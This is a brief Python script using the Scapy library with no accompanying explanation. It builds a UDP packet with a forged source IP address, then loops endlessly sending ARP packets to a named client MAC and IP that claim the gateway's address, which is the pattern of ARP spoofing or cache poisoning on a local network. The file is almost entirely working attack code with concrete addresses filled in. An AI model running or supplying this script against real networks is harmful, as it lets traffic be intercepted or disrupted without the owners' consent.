from scapy.all import *
from scapy.layers.inet import *


ip = IP(src="1.2.3.4", dst="192.168.0.1")
udp = UDP(sport=8888, dport=9090)
data = "test\n"
pkt = ip / udp / data

# pkt.show()
# send(pkt)


clientMAC = 'F4:0F:24:1A:13:F1'
gateway = '192.168.0.1'
client = '192.168.0.104'

send(
    Ether(dst=clientMAC) / ARP(op="who-has", psrc=gateway, pdst=client),
    inter=RandNum(10, 40),
    loop=1,
)
